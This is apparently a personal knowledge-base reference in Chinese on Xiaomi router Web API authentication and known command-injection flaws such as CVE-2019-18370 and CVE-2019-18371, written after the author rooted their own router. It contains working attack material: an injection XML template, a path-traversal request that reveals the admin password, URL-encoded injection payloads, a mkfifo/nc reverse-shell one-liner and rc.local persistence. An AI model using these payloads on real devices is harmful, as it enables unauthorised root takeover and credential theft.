---
title: 小米路由器 API 认证与利用参考
aliases: [小米API, 路由器漏洞, CVE-2019-18370]
tags: [reference/router, reference, network/router]
created: 2026-07-22
updated: 2026-08-17
status: stable
---

See also: [[Network-KB-Home]] | [[ROUTER-FULL-CAPABILITY]] | [[ROUTER-DEEP-EXPLORATION]] | [[2026-07-21-树莓派网络故障与路由器破解完整复盘]]
# 小米路由器 API 认证与漏洞利用 — 知识参考

> 本文档帮助理解小米路由器的 Web API 架构、认证机制和已知漏洞原理。
> 配合《树莓派网络故障与路由器破解完整复盘》阅读。

---

## 一、路由器系统架构

### 小米路由器本质上是 OpenWrt

小米路由器固件基于 OpenWrt 修改，核心组件：

```
Web 管理界面 (LuCI 修改版)
    ↓ HTTP
sysapihttpd (小米定制 HTTP 服务，替代 uhttpd)
    ↓ Lua CGI
API 处理函数 (xqsystem, xqnetwork, misystem 等)
    ↓
UCI 配置系统 (/etc/config/*)
    ↓
hostapd (WiFi) / dnsmasq (DNS) / dropbear (SSH)
```

**关键差异**：
- 小米固件是**精简版 OpenWrt**，没有 `uci`、`iptables`、`opkg` 等完整 OpenWrt 工具
- 配置可以直接编辑 `/etc/config/` 下的文件
- API 路径为 `/cgi-bin/luci/api/<模块>/<函数>`

---

## 二、认证机制：stok 令牌

### stok 是什么

stok (Session Token) 是小米路由器 API 的唯一认证凭据。登录后获取，所有后续 API 调用必须在 URL 路径中携带。

**重要**：stok 放在 URL 路径中，不是 HTTP Header 也不是查询参数：
```
正确: http://[IP已脱敏]/cgi-bin/luci/;stok=<token>/api/xqnetwork/xxx
错误: http://[IP已脱敏]/cgi-bin/luci/api/xqnetwork/xxx?stok=<token>
```

### 登录加密流程

登录需要三次密码变换：

```
Step 1: 打开登录页 → 提取 key 和 deviceId
Step 2: nonce = "0_" + deviceId + "_" + timestamp + "_" + random
Step 3: step1 = SHA1(password + key)
Step 4: password_hash = SHA1(nonce + step1)
Step 5: POST 到 /api/xqsystem/login
```

**为什么这样设计？**
- key 是前端加密密钥，防止中间人直接获取明文密码
- nonce 包含时间戳和随机数，防止重放攻击
- 双重 SHA1 使得暴力破解成本更高
- 但**管理员密码通常等于 WiFi 密码**，这是一个巨大的安全弱点

---

## 三、关键 API 端点

### 无需认证的端点

| 端点 | 返回内容 |
|------|---------|
| `/cgi-bin/luci/web/home` | 登录页 HTML，包含加密 key 和 deviceId |
| `/cgi-bin/luci/api/xqsystem` | SSH/Telnet 状态、固件版本 |
| `/cgi-bin/luci/api/xqsystem/bdata` | 路由器硬件信息（型号、SN、MAC） |

### 需要 stok 的端点

| 端点 | 方法 | 功能 |
|------|------|------|
| `/api/xqsystem/login` | POST | 登录获取 stok |
| `/api/misystem/devicelist` | GET | 已连接设备列表（IP、MAC、在线状态） |
| `/api/xqnetwork` | GET | WiFi 状态（SSID、up/down） |
| `/api/xqnetwork/set_wifi` | POST | 修改 WiFi 设置（信道、隔离等） |
| `/api/misystem/c_upload` | POST | **备份还原文件上传**（漏洞入口） |
| `/api/xqnetdetect/netspeed` | GET | **网络测速触发**（命令注入点） |
| `/api/misystem/set_sys_time` | GET | 设置系统时间（**另一个命令注入点**） |
| `/api/xqsystem/reboot` | POST | 重启路由器 |
| `/api` | GET | 路由器运行状态（CPU、内存、流量） |

---

## 四、CVE-2019-18370 漏洞原理（完整版）

### 漏洞元数据

| 项目 | 内容 |
|------|------|
| CVE | CVE-2019-18370 |
| CVSS | **9.8 (Critical)** |
| 向量 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| 发现者 | UltramanGaia (Kap0k) & Zhiniang Peng (Qihoo 360) |
| 影响 | 所有固件版本 < 2.28.23-stable |
| 修复 | 升级到 2.28.23-stable 或更高 |
| 受影响型号 | R3G, R4CM, R4A, 4C, 3Gv2, 3C, R3P 等多款 |

### 组合利用链

这是**两个功能的组合利用**，每个单独看都不是漏洞：

**功能 1：c_upload（备份还原）**
- 用户可以通过 Web 上传 tar.gz 备份文件来还原路由器设置
- 上传的文件被 `tar zxf` 解压到 `/tmp/` 目录
- **不验证压缩包内容**，攻击者可以控制 /tmp/ 下的任何文件
- API 路径：`/api/misystem/c_upload`
- 上传字段名：`image`（multipart/form-data）

**功能 2：netspeed（网络测速）**
- 路由器有一个测速脚本，从 `/tmp/speedtest_urls.xml` 读取 URL 列表
- 脚本遍历 `<item>` 元素，将 `url` 属性**未经过滤直接传入 shell**
- 实际的 shell 调用：`wget <url> -q -O /dev/null`
- API 路径：`/api/xqnetdetect/netspeed`

### 完整 XML 模板

```xml
<?xml version="1.0"?>
<root>
    <class type="1">
        <!-- 14 个正常测速 URL（掩人耳目） -->
        <item url="http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat"/>
        <!-- ... 重复 13 次 ... -->
    </class>
    <class type="2">
        <!-- 注入点：URL 中包含命令注入 -->
        <item url="http://{router_ip} -q -O /dev/null;{command};exit;wget http://{router_ip} "/>
    </class>
    <class type="3">
        <!-- 上传测速 URL（伪装） -->
        <item uploadurl="http://www.taobao.com/"/>
        <item uploadurl="http://www.qq.com/"/>
    </class>
</root>
```

### 命令注入原理

正常的 `<class type="2">` 条目：
```xml
<item url="http://speedtest.server.com/test.dat"/>
```

对应的 shell 命令：
```bash
wget http://speedtest.server.com/test.dat -q -O /dev/null
```

注入的条目：
```xml
<item url="http://[IP已脱敏] -q -O /dev/null; ANY_COMMAND; exit; wget http://[IP已脱敏] "/>
```

对应的 shell 命令变为：
```bash
wget http://[IP已脱敏] -q -O /dev/null; ANY_COMMAND; exit; wget http://[IP已脱敏]
```

**注入原理**：`;` 在 shell 中分隔命令，`-q -O /dev/null` 让前面的 wget 静默完成，然后执行我们的命令，`exit` 终止后续执行。**所有进程以 root 权限运行。**

### 为什么 c_upload 返回 1629

c_upload 返回 `{"code":1629,"msg":"解压失败"}` 是因为上传的 tar.gz **不是标准备份格式**（标准备份包含 `cfg_backup.des` 等元数据文件）。

但关键点是：**tar.gz 的解压是在校验之前进行的**。所以文件已经被提取到了 `/tmp/` 目录中，校验失败只是最后的格式检查没过。

**所以 code 1629 可以安全忽略。**

### 公开利用工具对比

| 工具 | 方法 | 访问方式 | R4CM 2.14.87 |
|------|------|---------|:-----------:|
| 原始 PoC (UltramanGaia) | c_upload + netspeed | telnetd + dropbear（本地） | 未测试 |
| FzBacon fork | c_upload + netspeed | telnetd + dropbear | 未测试 |
| **OpenWRTInvasion v0.0.1** | c_upload + netspeed | **mkfifo 反向 shell** | **✅ 确认有效** |
| OpenWRTInvasion master | c_upload + netspeed | TCP 文件服务器 | ❌ 无效 |
| v2 PoC (dingdongdong) | c_upload + netspeed | HTTP 文件服务器 | 需要 fw 2.30.20+ |

### CVE-2019-18371：认证绕过（辅助漏洞）

通过目录遍历读取 `/etc/config/account` 可在**不知道密码的情况下**获取管理员密码：
```
GET /api-third-party/download/extdisks../etc/config/account
```
如果 c_upload 需要认证（新固件需要 stok），这个漏洞可以提供密码。

---

## 五、set_sys_time 注入（另一个注入点）

### 原理

`/api/misystem/set_sys_time` 接受 `timezone` 参数，该参数被拼接到 shell 命令中：

```
时区设置命令: tz = '<timezone>'
注入: timezone = ' ; <command> ; '
结果: tz = '' ; <command> ; ''
```

**但在 R4CM 2.14.87 上不生效**——API 返回 `{"code":0}` 但命令未执行。可能是该版本对此参数做了输入校验（可能白名单检查有效时区）。

---

## 六、反向 Shell 机制

### mkfifo 命名管道

OpenWRTInvasion v0.0.1 使用 `mkfifo`（命名管道）实现反向 shell：

```bash
rm -rf /tmp/p
mkfifo /tmp/p                    # 创建命名管道
cat /tmp/p | /bin/sh -i 2>&1 | nc [IP已脱敏] 4444 > /tmp/p
```

**工作原理**：
1. `nc [IP已脱敏] 4444` 连接到攻击机的 4444 端口
2. `nc` 的输出（攻击机发来的命令）写入 `/tmp/p`
3. `cat /tmp/p` 读取命令并传给 `/bin/sh -i`
4. shell 的输出通过管道传回 `nc`，发送给攻击机
5. 形成闭环：攻击机 → nc → 管道 → shell → nc → 攻击机

### 为什么不用更简单的方法

直接 `nc -e /bin/sh` 需要 nc 支持 `-e` 参数，但路由器的 busybox nc 不支持。命名管道是通用的替代方案。

---

## 七、持久化机制

### R4CM 的存储分区

| 分区 | 持久性 | 用途 |
|------|--------|------|
| `/tmp/` | **易失**（重启清空） | 运行时临时文件 |
| `/etc/` | **部分持久** | 配置文件（部分在只读分区） |
| `/data/` | **完全持久** | 用户数据、插件、自定义文件 |

所以二进制文件必须放到 `/data/`，自启动脚本放到 `/etc/rc.local`。

### rc.local 自启动

`/etc/rc.local` 是系统启动时最后执行的脚本。在这里添加启动命令可以让 SSH 在任何重启后自动恢复。

---

## 八、所有已知命令注入 CVE

Xiaomi 路由器所有进程以 **root** 权限运行，任意命令注入 = 完全系统控制。

| CVE | CVSS | 注入点 | 参数 | 认证 | 说明 |
|-----|------|--------|------|:--:|------|
| **CVE-2019-18370** | 9.8 | `c_upload` + `netspeed` | speedtest URL | 需要 | tar.gz 提取到 /tmp，netspeed 读 XML 执行 |
| **CVE-2020-14100** | 9.8 | `set_wan6` | `dns1`（`\n` 绕过） | 无需 | 影响 R3600 < 1.0.66 |
| **CVE-2020-14140** | 7.5 | 多个无需认证 API | — | 无需 | API 暴露导致 WiFi 密码泄漏 |
| **CVE-2023-26319** | 7.2 | `request_smartcontroller` | `mac` | 需要 | 注入格式：`;&lt;CMD&gt;;#` |
| **CVE-2023-26317** | 7.0 | 外部接口 | 响应过滤不足 | — | 劫持 ISP/上级路由时可用 |
| **CVE-2018-16130** | 8.8 | `request_mitv` | `payload` | — | 小米路由器 3（2.22.15） |
| **CVE-2018-13023** | 8.8 | `wifi_access` | `timeout` | — | 小米路由器 3（2.22.15） |
| **无 CVE** | — | `start_binding` | `key` | 需要 | `key=1234'%0Anvram%20set%20ssh_en%3D1'` |
| **无 CVE** | — | `set_sys_time` | `timezone` | 需要 | `%20%27%20%3b%20&lt;CMD&gt;%20%3b%20` |
| **无 CVE** | — | `set_wifi_ap` | `channel` | 需要 | `channel=1%3Bnvram%20set%20ssh_en%3D1` |
| **无 CVE** | — | `set_config_iotdev` | `ssid` | 需要 | `ssid=-h%3B%20&lt;CMD&gt;%3B` |

### 扩展 API 端点表

研究人员在固件中通过 `grep entry({"api"` 发现了 **约 500 个 API 端点**。以下为重要端点分类：

#### 系统管理

| 端点 | 认证 | 说明 |
|------|:--:|------|
| `init_info` | 否 | 硬件版本、ROM 版本、国家、型号、`newEncryptMode` |
| `fac_info` | 否 | telnet/SSH 状态、安全启动、UART 状态 |
| `sys_info` | 否 | 系统信息、ROM 版本和发布渠道 |
| `bdata` | 否* | 路由器硬件信息、SN、型号 |
| `status` | 是 | CPU、内存、温度、运行时间 |
| `lan_wan` | 是 | WAN/LAN 口速度和流量统计 |
| `information` | 是 | 完整配置：WiFi、WAN/LAN、DNS、加密 |

#### 登录与密码

| 端点 | 认证 | 说明 |
|------|:--:|------|
| `login` | 否 | 登录获取 stok |
| `set_name_password` | 是 | 修改管理员密码（参数：`oldPwd`, `newPwd`） |
| `router_init` | 是 | 设置初始化信息（密码、WiFi、WAN 类型） |

#### 固件更新

| 端点 | 认证 | 说明 |
|------|:--:|------|
| `check_rom_update` | 是 | 检查固件更新 |
| `upload_rom` | 是 | 上传 ROM 文件 |
| `flash_rom` | 是 | 刷入已上传的 ROM |

#### 智能家居

| 端点 | 认证 | 说明 |
|------|:--:|------|
| `request_smartcontroller` | 是 | **CVE-2023-26319** 注入点 |
| `request` | 是 | 智能家居请求 |
| `request_miio` | 是 | MiIO 设备请求 |

### stok 生命周期

- stok 在浏览器登录或 API 调用 `/api/xqsystem/login` 后获取
- 确切的超时时间因固件版本而异
- 在某些集成中，token 被缓存约 **10 分钟**
- 过期后需要重新登录
- stok 必须出现在 URL 路径中：`/cgi-bin/luci/;stok=<TOKEN>/api/...`

### 加密模式检测

较新固件使用 SHA256 而非 SHA1：
```json
// GET /api/xqsystem/init_info
{"newEncryptMode": 1}  // 1=SHA256, 0=SHA1
```

### 为什么管理员密码等于 WiFi 密码

小米路由器的初始设置流程中，用户只需设置 WiFi 密码。这个密码**同时被用作**：
- WiFi WPA2 密钥
- 路由器管理密码
- API 登录密码

这是一个便利性 vs 安全性的权衡。大多数用户不会意识到管理密码和 WiFi 密码是同一个。

### sysapihttpd 的端口暴露

`sysapihttpd` 是小米路由器的核心 HTTP 服务，取代了标准 OpenWrt 的 `uhttpd`。它在**所有网络接口**（[IP已脱敏]）上监听数十个端口。这是因为：
- WAN 口也需要访问某些 API（如测速、远程管理）
- 小米的 MiWiFi APP 可能从外网访问管理面板
- 固件设计未区分 WAN/LAN 访问控制

**在没有 iptables 的精简固件上，无法在 IP 层做访问控制。最有效的防护是确保路由器在 NAT 后面（上级设备分配私有 IP）。**

---

> **参考资源**
> - OpenWRTInvasion: https://github.com/acecilia/OpenWRTInvasion
> - CVE-2019-18370: https://nvd.nist.gov/vuln/detail/CVE-2019-18370
> - Xiaomi Router Patcher: https://github.com/openwrt-xiaomi/xmir-patcher

## Related

- [[AGENTS]] — AI 协作规范
- [[Network-KB-Home]] — 网络知识库
- [[ROUTER-FULL-CAPABILITY]] — 路由器能力手册
- [[2026-07-21-树莓派网络故障与路由器破解完整复盘]] — 事故复盘
- [[参考-网络路由与代理排障]] — 网络路由与代理排障
